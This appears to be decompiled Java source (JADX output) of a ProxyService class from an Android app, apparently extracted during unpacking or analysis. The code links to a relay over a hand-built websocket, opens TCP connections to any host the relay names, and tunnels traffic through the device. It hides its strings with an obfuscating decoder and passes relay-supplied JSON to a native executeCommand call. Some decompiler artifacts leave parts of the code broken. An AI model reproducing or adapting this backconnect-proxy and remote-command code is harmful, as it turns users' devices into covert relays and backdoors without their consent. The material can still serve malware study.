package com.base.template.services;

import androidx.work.impl.Processor$$ExternalSyntheticLambda2;
import com.base.template.NativeBridge;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Iterator;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import kotlin.Unit;
import kotlin.collections.ArraysKt;
import kotlin.collections.EmptyList;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Lambda;
import kotlin.text.Charsets;
import kotlin.text.StringsKt;
import okhttp3.Headers;
import org.json.JSONObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class ProxyService {
    public static volatile ProxyService instance;
    public volatile OutputStream wsOutput;
    public volatile Socket wsSocket;
    public final AtomicBoolean running = new AtomicBoolean(false);
    public String relayUrl = "";
    public String deviceId = "";
    public String apiSecret = "";
    public final ConcurrentHashMap channels = new ConcurrentHashMap();
    public final ExecutorService executor = Executors.newCachedThreadPool();
    public final Object writeLock = new Object();

    public final class ChannelState {
        public volatile boolean active = true;
        public final InputStream input;
        public final OutputStream output;
        public final Socket socket;

        public ChannelState(Socket socket, InputStream inputStream, OutputStream outputStream) {
            this.socket = socket;
            this.input = inputStream;
            this.output = outputStream;
        }
    }

    /* JADX INFO: renamed from: com.base.template.services.ProxyService$computeHmac$1, reason: invalid class name */
    public final class AnonymousClass1 extends Lambda implements Function1 {
        public static final AnonymousClass1 INSTANCE;
        public static final AnonymousClass1 INSTANCE$1;
        public final /* synthetic */ int $r8$classId;

        static {
            int i = 1;
            INSTANCE$1 = new AnonymousClass1(i, 1);
            INSTANCE = new AnonymousClass1(i, 0);
        }

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public /* synthetic */ AnonymousClass1(int i, int i2) {
            super(i);
            this.$r8$classId = i2;
        }

        @Override // kotlin.jvm.functions.Function1
        public final Object invoke(Object obj) {
            switch (this.$r8$classId) {
                case 0:
                    return String.format(C0000.decode(new byte[]{70, 0, 86, 77}, "c0d553fb18"), Arrays.copyOf(new Object[]{Byte.valueOf(((Number) obj).byteValue())}, 1));
                default:
                    try {
                        NativeBridge.executeCommand(((JSONObject) obj).toString());
                        break;
                    } catch (Exception unused) {
                    }
                    return Unit.INSTANCE;
            }
        }
    }

    public static String computeHmac(String str, String str2) throws NoSuchAlgorithmException, InvalidKeyException {
        String strDecode = C0000.decode(new byte[]{43, 11, 80, 90, 102, 126, 117, 83, 3, 15}, "cf19564a693c685e", 0.0f);
        Mac mac = Mac.getInstance(strDecode);
        Charset charset = Charsets.UTF_8;
        mac.init(new SecretKeySpec(str.getBytes(charset), strDecode));
        return StringsKt.take(ArraysKt.joinToString$default(mac.doFinal(str2.getBytes(charset)), AnonymousClass1.INSTANCE), 32);
    }

    public static int readFully(InputStream inputStream, byte[] bArr) throws IOException {
        int i = 0;
        while (i < bArr.length) {
            int i2 = inputStream.read(bArr, i, bArr.length - i);
            if (i2 < 0) {
                return -1;
            }
            i += i2;
        }
        return i;
    }

    public static String readLine(InputStream inputStream) throws IOException {
        StringBuilder sb = new StringBuilder();
        while (true) {
            int i = inputStream.read();
            if (i < 0 || i == 10) {
                break;
            }
            if (i != 13) {
                sb.append((char) i);
            }
        }
        return sb.toString();
    }

    public final void cleanup() {
        for (ChannelState channelState : this.channels.values()) {
            channelState.active = false;
            try {
                channelState.socket.close();
            } catch (Exception unused) {
            }
        }
        this.channels.clear();
    }

    public final void handleFrame(byte[] bArr) {
        ChannelState channelState;
        if (bArr.length < 5) {
            return;
        }
        byte b = bArr[0];
        ByteBuffer byteBufferWrap = ByteBuffer.wrap(bArr, 1, 4);
        ByteOrder byteOrder = ByteOrder.BIG_ENDIAN;
        final int i = byteBufferWrap.order(byteOrder).getInt();
        int length = bArr.length;
        Headers.Companion.copyOfRangeToIndexCheck(length, bArr.length);
        byte[] bArrCopyOfRange = Arrays.copyOfRange(bArr, 5, length);
        if (b == 1) {
            if (bArrCopyOfRange.length < 4) {
                sendFail(C0000.decode(new byte[]{6, 2, 1}, "dcecc8aa", 0.0f), i);
                return;
            }
            int i2 = ByteBuffer.wrap(bArrCopyOfRange, 0, 2).order(byteOrder).getShort() & 65535;
            int i3 = i2 + 2;
            if (bArrCopyOfRange.length < i2 + 4) {
                sendFail(C0000.decode(new byte[]{75, 88, 90, 65, 70}, "805329d97ddf7a92", 0.0f), i);
                return;
            }
            final String str = new String(bArrCopyOfRange, 2, i2, Charsets.UTF_8);
            final int i4 = ByteBuffer.wrap(bArrCopyOfRange, i3, 2).order(byteOrder).getShort() & 65535;
            this.executor.submit(new Runnable() { // from class: com.base.template.services.ProxyService$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    Socket socket;
                    int i5;
                    String str2 = str;
                    int i6 = i4;
                    ProxyService proxyService = this;
                    int i7 = i;
                    try {
                        try {
                            try {
                                Socket socket2 = new Socket();
                                socket2.connect(new InetSocketAddress(str2, i6), 10000);
                                ProxyService.ChannelState channelState2 = new ProxyService.ChannelState(socket2, socket2.getInputStream(), socket2.getOutputStream());
                                proxyService.channels.put(Integer.valueOf(i7), channelState2);
                                proxyService.sendWsFrame(ByteBuffer.allocate(5).order(ByteOrder.BIG_ENDIAN).put((byte) 2).putInt(i7).array());
                                byte[] bArr2 = new byte[32768];
                                while (channelState2.active && !socket2.isClosed()) {
                                    try {
                                        i5 = channelState2.input.read(bArr2);
                                    } catch (Exception unused) {
                                        i5 = -1;
                                    }
                                    if (i5 <= 0) {
                                        break;
                                    } else {
                                        proxyService.sendDataFrame(i7, Arrays.copyOf(bArr2, i5));
                                    }
                                }
                                ProxyService.ChannelState channelState3 = (ProxyService.ChannelState) proxyService.channels.remove(Integer.valueOf(i7));
                                if (channelState3 != null) {
                                    channelState3.active = false;
                                    socket = channelState3.socket;
                                    socket.close();
                                }
                            } catch (Exception e) {
                                String message = e.getMessage();
                                if (message == null) {
                                    message = C0000.decode(new byte[]{4, 66, 22}, "a0d9f8", 4);
                                }
                                proxyService.sendFail(message, i7);
                                ProxyService.ChannelState channelState4 = (ProxyService.ChannelState) proxyService.channels.remove(Integer.valueOf(i7));
                                if (channelState4 != null) {
                                    channelState4.active = false;
                                    socket = channelState4.socket;
                                }
                            }
                        } catch (Exception unused2) {
                        }
                        proxyService.sendCloseFrame(i7);
                    } catch (Throwable th) {
                        ProxyService.ChannelState channelState5 = (ProxyService.ChannelState) proxyService.channels.remove(Integer.valueOf(i7));
                        if (channelState5 != null) {
                            channelState5.active = false;
                            try {
                                channelState5.socket.close();
                            } catch (Exception unused3) {
                            }
                        }
                        proxyService.sendCloseFrame(i7);
                        throw th;
                    }
                }
            });
            return;
        }
        if (b == 4) {
            ChannelState channelState2 = (ChannelState) this.channels.get(Integer.valueOf(i));
            if (channelState2 == null) {
                return;
            }
            this.executor.submit(new Processor$$ExternalSyntheticLambda2(channelState2, 11, bArrCopyOfRange));
            return;
        }
        if (b != 5 || (channelState = (ChannelState) this.channels.remove(Integer.valueOf(i))) == null) {
            return;
        }
        channelState.active = false;
        try {
            channelState.socket.close();
        } catch (Exception unused) {
        }
    }

    /* JADX WARN: Code duplicated, block: B:26:0x004b  */
    /* JADX WARN: Code duplicated, block: B:29:0x0055  */
    /* JADX WARN: Code duplicated, block: B:33:0x005e  */
    /* JADX WARN: Code duplicated, block: B:36:0x0068 A[DONT_INVERT] */
    /* JADX WARN: Code duplicated, block: B:37:0x006a A[ADDED_TO_REGION, LOOP:0: B:37:0x006a->B:38:0x006c, LOOP_START, PHI: r4
      0x006a: PHI (r4v1 int) = (r4v0 int), (r4v2 int) binds: [B:36:0x0068, B:38:0x006c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Code duplicated, block: B:38:0x006c A[LOOP:0: B:37:0x006a->B:38:0x006c, LOOP_END] */
    /* JADX WARN: Code duplicated, block: B:42:0x007e  */
    /* JADX WARN: Code duplicated, block: B:44:0x0082  */
    /* JADX WARN: Code duplicated, block: B:46:0x008a A[RETURN] */
    public final byte[] readWsFrame(InputStream inputStream) throws IOException {
        int i;
        byte[] bArr;
        int i2;
        byte[] bArr2;
        int i3;
        int i4 = inputStream.read();
        if (i4 >= 0 && (i = inputStream.read()) >= 0) {
            boolean z = (i & 128) != 0;
            long j = i & 127;
            int i5 = (int) j;
            if (i5 == 126) {
                int i6 = inputStream.read();
                int i7 = inputStream.read();
                if (i6 >= 0 && i7 >= 0) {
                    j = (i6 << 8) | i7;
                    if (z) {
                        bArr = new byte[4];
                        if (readFully(inputStream, bArr) >= 0) {
                        }
                    } else {
                        bArr = null;
                    }
                    if (j <= 2097152) {
                        i2 = (int) j;
                        bArr2 = new byte[i2];
                        if (readFully(inputStream, bArr2) >= 0) {
                            if (bArr != null) {
                                for (int i8 = 0; i8 < i2; i8++) {
                                    bArr2[i8] = (byte) (bArr2[i8] ^ bArr[i8 % 4]);
                                }
                            }
                            i3 = i4 & 15;
                            if (i3 != 8) {
                                if (i3 != 9) {
                                    return bArr2;
                                }
                                sendWsFrame(bArr2);
                                return readWsFrame(inputStream);
                            }
                        }
                    }
                }
            } else if (i5 != 127) {
                if (z) {
                    bArr = new byte[4];
                    if (readFully(inputStream, bArr) >= 0) {
                    }
                } else {
                    bArr = null;
                }
                if (j <= 2097152) {
                    i2 = (int) j;
                    bArr2 = new byte[i2];
                    if (readFully(inputStream, bArr2) >= 0) {
                        if (bArr != null) {
                            while (i8 < i2) {
                                bArr2[i8] = (byte) (bArr2[i8] ^ bArr[i8 % 4]);
                            }
                        }
                        i3 = i4 & 15;
                        if (i3 != 8) {
                            if (i3 != 9) {
                                return bArr2;
                            }
                            sendWsFrame(bArr2);
                            return readWsFrame(inputStream);
                        }
                    }
                }
            } else {
                byte[] bArr3 = new byte[8];
                if (readFully(inputStream, bArr3) >= 0) {
                    j = ByteBuffer.wrap(bArr3).getLong();
                    if (z) {
                        bArr = new byte[4];
                        if (readFully(inputStream, bArr) >= 0) {
                        }
                    } else {
                        bArr = null;
                    }
                    if (j <= 2097152) {
                        i2 = (int) j;
                        bArr2 = new byte[i2];
                        if (readFully(inputStream, bArr2) >= 0) {
                            if (bArr != null) {
                                while (i8 < i2) {
                                    bArr2[i8] = (byte) (bArr2[i8] ^ bArr[i8 % 4]);
                                }
                            }
                            i3 = i4 & 15;
                            if (i3 != 8) {
                                if (i3 != 9) {
                                    return bArr2;
                                }
                                sendWsFrame(bArr2);
                                return readWsFrame(inputStream);
                            }
                        }
                    }
                }
            }
        }
        return null;
    }

    public final void sendCloseFrame(int i) {
        sendWsFrame(ByteBuffer.allocate(5).order(ByteOrder.BIG_ENDIAN).put((byte) 5).putInt(i).array());
    }

    public final void sendDataFrame(int i, byte[] bArr) {
        sendWsFrame(ByteBuffer.allocate(bArr.length + 5).order(ByteOrder.BIG_ENDIAN).put((byte) 4).putInt(i).put(bArr).array());
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v10, types: [kotlin.collections.EmptyList] */
    /* JADX WARN: Type inference failed for: r0v11, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r0v12, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r0v2, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.util.Collection] */
    public final void sendFail(String str, int i) {
        ?? arrayList;
        byte[] bytes = str.getBytes(Charsets.UTF_8);
        int i2 = 0;
        if (200 >= bytes.length) {
            int length = bytes.length;
            if (length == 0) {
                arrayList = EmptyList.INSTANCE;
            } else if (length != 1) {
                arrayList = new ArrayList(bytes.length);
                for (byte b : bytes) {
                    arrayList.add(Byte.valueOf(b));
                }
            } else {
                arrayList = Collections.singletonList(Byte.valueOf(bytes[0]));
            }
        } else {
            arrayList = new ArrayList(200);
            int i3 = 0;
            for (byte b2 : bytes) {
                arrayList.add(Byte.valueOf(b2));
                i3++;
                if (i3 == 200) {
                    break;
                }
            }
        }
        int size = arrayList.size();
        byte[] bArr = new byte[size];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr[i2] = ((Number) it.next()).byteValue();
            i2++;
        }
        sendWsFrame(ByteBuffer.allocate(size + 7).order(ByteOrder.BIG_ENDIAN).put((byte) 3).putInt(i).putShort((short) size).put(bArr).array());
    }

    public final void sendWsFrame(byte[] bArr) {
        synchronized (this.writeLock) {
            try {
                OutputStream outputStream = this.wsOutput;
                if (outputStream == null) {
                    return;
                }
                byte[] bArr2 = new byte[4];
                new SecureRandom().nextBytes(bArr2);
                int length = bArr.length;
                outputStream.write(130);
                if (length < 126) {
                    outputStream.write(length | 128);
                } else if (length < 65536) {
                    outputStream.write(254);
                    outputStream.write(length >> 8);
                    outputStream.write(length & 255);
                } else {
                    outputStream.write(255);
                    outputStream.write(ByteBuffer.allocate(8).putLong(length).array());
                }
                outputStream.write(bArr2);
                byte[] bArr3 = new byte[length];
                for (int i = 0; i < length; i++) {
                    bArr3[i] = (byte) (bArr[i] ^ bArr2[i % 4]);
                }
                outputStream.write(bArr3);
                outputStream.flush();
            } catch (Exception unused) {
            } catch (Throwable th) {
                throw th;
            }
        }
    }
}
